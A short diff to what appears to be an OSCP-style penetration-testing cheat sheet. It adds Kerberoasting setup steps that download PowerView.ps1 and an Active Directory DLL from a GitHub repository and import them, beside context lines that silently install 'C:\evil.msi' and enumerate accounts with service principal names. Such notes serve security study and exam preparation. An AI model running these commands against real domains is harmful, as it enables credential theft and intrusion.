@@ -244,6 +244,15 @@ msiexec /quiet /qn /i C:\evil.msi
 ```
 # ATTACK - ACTIVE DIRECTORY
 ## KERBEROASTING
+##### KERBEROASTING - LOAD REQUIREMENTS
+```
+curl https://github.com/n0ts0cial/oscp/raw/main/Microsoft.ActiveDirectory.Management.dll -Outfile Microsoft.ActiveDirectory.Management.dll
+import-module .\Microsoft.ActiveDirectory.Management.dll
+```
+```
+curl https://github.com/n0ts0cial/oscp/raw/main/PowerView.ps1  -Outfile PowerView.ps1
+import-module .\PowerView.ps1
+```
 ##### KERBEROASTING - FIND SPN
 ```
 Get-ADUSer -Filter { ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName | select SamAccountName, ServicePrincipalName
